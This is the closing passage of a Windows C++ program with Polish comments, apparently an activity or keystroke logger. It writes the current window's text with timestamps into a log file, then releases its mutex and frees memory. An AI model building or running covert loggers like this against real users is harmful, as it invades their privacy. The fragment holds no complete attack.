       else BuforPlikowy1->bufor.pos[CRT] = BuforPlikowy1->bufor.pos[USR]; // jeœli nie to zmieñ pozycjê nadpisania na star¹
       stk::cstr::mov(HWNDlpTextPrv,HWNDlpTextCrt);
       GetTimeFormatA(LOCALE_USER_DEFAULT,0,&SystemTime,"HH'.'mm'.'ss'::'",HWNDlpTextTmp,255);
       stk::cstr::cat(HWNDlpTextTmp,HWNDlpTextCrt);
       stk::cstr::mov(HWNDlpTextLog,"\r\n\[");
       stk::cstr::cat(HWNDlpTextLog,HWNDlpTextTmp);
       stk::cstr::cat(HWNDlpTextLog,"]:");
       BuforPlikowy1->save(HWNDlpTextLog,CRT);
       BuforPlikowy1->bufor.pos[PRV] = BuforPlikowy1->bufor.pos[CRT]; // PRV = CRT i od tej pory jesli coœ bêdzie naciœniête => PRV < CRT
       }
}
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
BuforPlikowy1->save("\r\n}\0",CRT);
CloseHandle(hInstanceMutex);
stk::cstr::free(HWNDlpTextPrv);
stk::cstr::free(HWNDlpTextCrt);
stk::cstr::free(HWNDlpTextLog);
delete BuforPlikowy1;
return 0;
}
//---------------------------------------------------------------------------


